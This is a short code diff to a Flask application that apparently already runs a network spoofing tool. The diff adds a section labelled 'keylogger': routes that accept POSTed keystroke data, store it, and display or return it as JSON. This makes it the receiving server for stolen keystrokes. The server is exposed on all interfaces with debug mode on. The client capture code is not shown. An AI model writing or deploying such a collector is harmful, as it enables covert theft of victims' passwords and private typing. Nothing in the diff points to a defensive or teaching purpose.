@@ -181,6 +181,30 @@ def get_visited_ips():
         return jsonify(list(spoofer.visited_ips))  # Return IPs as JSON
     return jsonify({"status": "error", "message": "No spoofing is running."})
         
+# keylogger
+received_data_list = []
+
+@app.route('/show_data')
+def index():
+    return render_template('keylogger.html', data_list=received_data_list)
+
+@app.route('/get_data')
+def get_data():
+    return jsonify(received_data_list)
+
+@app.route('/receive_data', methods=['POST'])
+def receive_keystroke():
+    data = request.get_json()
+    
+    # Add the received data to our list
+    received_data_list.append(data)
+    print(f"Received data: {data}")
+    print(f"Current data list: {received_data_list}")
+    
+    return jsonify({
+        "message": "Data received successfully",
+        "current_list": received_data_list
+    }), 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
